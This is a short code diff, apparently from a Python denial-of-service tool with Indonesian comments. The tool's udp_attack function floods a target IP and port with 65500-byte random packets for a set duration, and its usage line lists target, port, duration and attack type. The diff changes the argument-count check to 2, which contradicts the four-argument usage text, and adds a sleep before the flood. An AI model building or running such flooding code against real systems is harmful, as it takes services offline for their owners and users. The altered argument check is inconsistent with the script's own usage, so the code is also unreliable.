@@ -30,7 +30,7 @@ def display_banner(): #logo program.
     print(banner_text)
 def parse_arguments(): 
     # Mengurai dan memvalidasi argumen baris perintah.
-    if len(sys.argv) != 5:
+    if len(sys.argv) != 2:
         print(f"""
         {Fore.LIGHTYELLOW_EX}Use » python {os.path.basename(__file__)} [target] [port] [duration] [attack_type]
         {Fore.LIGHTGREEN_EX} Type Attacks 
@@ -64,6 +64,7 @@ def udp_attack(target_ip, target_port, duration):
     packet_data = random._urandom(65500)
     end_time = time.time() + duration
     packets_sent = 0
+    time.sleep(2)
     print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} UDP attack has on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
     
     while time.time() < end_time:
